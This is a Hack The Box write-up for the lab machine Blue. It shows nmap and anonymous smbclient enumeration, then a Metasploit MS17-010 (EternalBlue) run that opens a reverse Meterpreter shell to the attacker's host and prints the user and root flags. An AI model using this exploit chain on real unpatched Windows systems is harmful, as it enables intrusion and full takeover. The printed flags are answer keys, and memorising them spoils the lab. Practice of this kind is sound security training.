---
title: HTB Machine Blue
date: 2022-04-15 
categories: [writeup]
tags: [writeup, hackthebox, windows]
---

# Hackthebox Blue Writeup
This is the writeup for the machine Blue from Hack the box

## Box Info
![Box info](https://i.imgur.com/yNgTZDJ.png)

## Enumeration
### Nmap scan

```bash
nmap -sV -sC -v -oN nmap.txt 10.129.155.247
```

```bash
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-23T16:51:52
|_  start_date: 2022-02-23T16:49:33
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-02-23T16:51:50+00:00
|_clock-skew: mean: 3s, deviation: 1s, median: 2s
```

### SMB

```bash
└──╼ [★]$ smbclient -N -L //10.129.155.247/ 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Share           Disk      
	Users           Disk      
SMB1 disabled -- no workgroup available

└──╼ [★]$ smbclient -N //10.129.155.247/Share 

empty

└──╼ [★]$ smbclient -N //10.129.155.247/Users 

  .                                  DR        0  Fri Jul 21 07:56:23 2017
  ..                                 DR        0  Fri Jul 21 07:56:23 2017
  Default                           DHR        0  Tue Jul 14 08:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 05:54:24 2009
  Public                             DR        0  Tue Apr 12 08:51:29 2011
```


## Getting Shell
Try to exploit `ms17_010`, getting shell, admin and flags :)

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.6:10004 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.6:10004 -> 10.10.10.40:49158 ) at 2022-06-21 12:54:27 +0300

meterpreter > 
meterpreter > sysinfo
Computer        : HARIS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 
<SNIP>
...
</SNIP>
meterpreter > cat Desktop/user.txt
7438e53faa292a66c0ca749e656790be

meterpreter > cd Desktop
dmeterpreter > dir
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-21 09:56:40 +0300  desktop.ini
100444/r--r--r--  34    fil   2022-06-21 12:49:29 +0300  root.txt
meterpreter > cat root.txt
83581f86ebb44a064a21762489b3bef4
```

